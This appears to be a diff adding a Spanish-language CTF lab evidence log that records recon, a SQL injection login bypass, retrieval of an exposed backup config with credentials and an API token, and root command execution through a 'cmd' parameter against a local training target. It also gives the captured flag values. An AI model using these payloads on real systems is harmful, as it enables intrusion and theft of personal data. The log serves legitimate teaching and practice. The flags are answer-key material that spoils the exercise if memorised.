@@ -1,0 +1,45 @@
+R1 — 28/10/2026 — PowerShell
+Repo: C:/Users/Muhammed/Desktop/Facultad/Seguridad Laboratorios/LabsSeguridadInformatica2026
+Capturas HTTP con Tee-Object, UTF-8, sin edición del contenido.
+1. git -c safe.directory=<repo> -C <repo> status --short --branch -> labfinal-grupo06, limpio.
+2. Lectura plan y referencia adjuntos, README, plantilla, rúbrica, start.sh, Compose y Makefile. Búsqueda AGENTS.md: ninguno. Se aplican CONTRIBUTING y PROTOCOLO-EVIDENCIA revisados en esta sesión. No se leyó server.py del objetivo ni soluciones.
+3. docker ps --format '{{.Names}} {{.Image}} {{.Status}}' -> acceso denegado a configuración Docker bajo cuenta restringida.
+4. docker ps -a --format '{{.Names}} {{.Image}} {{.Status}}' con cuenta propietaria -> solo dos contenedores ajenos detenidos; no se tocaron.
+5. Desde raíz: docker compose -p cyberlab --project-directory . -f entorno/docker-compose.yml -f labs/labfinal-practico-integrador/entorno/target.compose.yml up -d --build -> construido e iniciado entorno oficial. Descarga de imagen base Docker; ninguna operación sobre remotos Git.
+6. docker exec cyberlab-attacker curl -sS -i --max-time 10 http://phantomcorp/ -> p1-inicio.txt
+7. docker exec cyberlab-attacker curl -sS -i --max-time 10 http://phantomcorp/robots.txt -> p1-robots.txt
+8. docker exec cyberlab-attacker curl -sS -i --max-time 10 http://phantomcorp/portal-rrhh -> p1-r1-portal.txt
+9. docker exec cyberlab-attacker curl -sS -i --max-time 10 http://phantomcorp/p1-control-inexistente -> p1-control.txt
+10. Git Bash: bash <repo>/ctf submit final R1 'FLAG{final_recon_portal}'. El submit directo fue rechazado por los finales de línea CRLF del manifiesto en Windows.
+11. Git Bash: revalidación de R1 con una copia temporal del manifiesto normalizada CRLF->LF (original de labs/ sin modificar); aceptación de R1. La salida del submit aceptado se conserva en p1-submit.txt.
+12. Git Bash: bash <repo>/ctf status final -> status-final.txt, 1/4. Exit 1 por lab incompleto.
+13. Creación de informe y traspaso P1; copia a entregas/labfinal/grupo06.
+14. git -C <repo> diff --exit-code -- labs bin ctf .github README.md CONTRIBUTING.md
+15. git -C <repo> diff --cached --exit-code
+16. git -C <repo> status --short --branch
+17. docker ps --filter name=cyberlab --format '{{.Names}} {{.Status}}' -> entorno-final.txt
+No se ejecutó add, commit, fetch, push, explotación R2 ni lectura del código objetivo. Los contenedores se dejan activos para continuidad P2.
+
+R2 — 28/10/2026 — Explotación. Desde cyberlab-attacker, contra http://phantomcorp/portal/login (action del formulario hallado en R1). Capturas con -i, UTF-8, sin editar el cuerpo.
+18. docker exec cyberlab-attacker curl -sS -i --max-time 10 -X POST http://phantomcorp/portal/login --data-urlencode "user=p2-prueba-invalida" --data-urlencode "pass=credencial-invalida" -> p2-r2-base.txt. Línea base: HTTP 401, "Credenciales invalidas".
+19. docker exec cyberlab-attacker curl -sS -i --max-time 10 -X POST http://phantomcorp/portal/login --data-urlencode "user=' OR '1'='1' -- " --data-urlencode "pass=x" -> p2-r2-acceso.txt. HTTP 200, "Bienvenido admin. Dashboard RRHH.", FLAG{final_sqli_foothold}. La respuesta indica /backup/rrhh.conf.
+20. Submit R2 con manifiesto normalizado CRLF->LF (copia temporal, original de labs/ sin modificar) -> p2-validacion-ctf.txt, 2/4. No se consultó /backup/rrhh.conf en este hito.
+
+R3 — 29/10/2026 — Post-explotación. Desde cyberlab-attacker. Se parte del recurso señalado en R2.
+21. docker exec cyberlab-attacker curl -sS -i --max-time 10 http://phantomcorp/backup/rrhh.conf -> p3-r3-evidencia.txt. HTTP 200, texto plano con DB_USER, DB_PASS, API_TOKEN y FLAG{final_token_looted}. Sin credenciales ni cookie: el archivo es alcanzable sin pasar por el portal.
+22. docker exec cyberlab-attacker curl -sS -i --max-time 10 http://phantomcorp/backup/p3-control-inexistente.conf -> p3-control.txt. Control negativo: HTTP 404; descarta respuesta genérica de /backup/.
+23. Submit R3 (manifiesto normalizado, original sin modificar) -> p3-submit.txt (FLAG CAPTURADA) y p3-validacion-ctf.txt, 3/4. No se usó el token contra /api/reporte en este hito.
+
+R4 — 29/10/2026 — Impacto. Desde cyberlab-attacker. El token se obtiene en el momento del recurso de R3; no se copia su valor en la bitácora. Solicitudes de solo lectura.
+24. TOKEN=$(curl -fsS --max-time 10 http://phantomcorp/backup/rrhh.conf | sed -n 's/^API_TOKEN=//p')
+25. curl -sS -i --max-time 10 --get --data-urlencode "token=$TOKEN" http://phantomcorp/api/reporte -> p4-r4-identidad.txt. Sin cmd devuelve id: uid=0(root).
+26. curl -sS -i --max-time 10 --get --data-urlencode "token=$TOKEN" --url "http://phantomcorp/api/reporte?cmd=ls+priv" -> p4-r4-recurso.txt. Directorio priv contiene clientes.db.txt.
+27. curl -sS -i --max-time 10 --get --data-urlencode "token=$TOKEN" --url "http://phantomcorp/api/reporte?cmd=wc+-l+priv/clientes.db.txt" -> p4-r4-conteo.txt. 1 línea.
+28. curl -sS -i --max-time 10 --get --data-urlencode "token=$TOKEN" --url "http://phantomcorp/api/reporte?cmd=head+-n+1+priv/clientes.db.txt" -> p4-r4-impacto.txt. HTTP 200: "clientes: 48210 registros (nombre, DNI, tarjeta)." y FLAG{final_crown_jewels}. No se leyeron registros individuales.
+29. Submit R4 (manifiesto normalizado, original sin modificar) -> p4-r4-submit.txt (FLAG CAPTURADA).
+
+Verificación final — 30/10/2026 — Reproducción independiente del recorrido R1-R4 en el entorno autorizado.
+30. Reproducción de R1-R4 y registro -> p5-verificacion-final.txt. Valores sensibles omitidos.
+31. ./ctf status final -> p5-status-final-4de4.txt, 4/4 (100%). Salida guardada en texto plano (se retiraron los códigos de color de terminal; contenido sin cambios).
+
+Alcance general: solo el HTTP de phantomcorp. No se escanearon otros hosts, no se leyó el código del objetivo, no hubo extracción masiva, modificación de datos ni acciones destructivas. El manifiesto original de labs/ no se modificó; la normalización CRLF->LF se aplicó siempre sobre copias temporales.
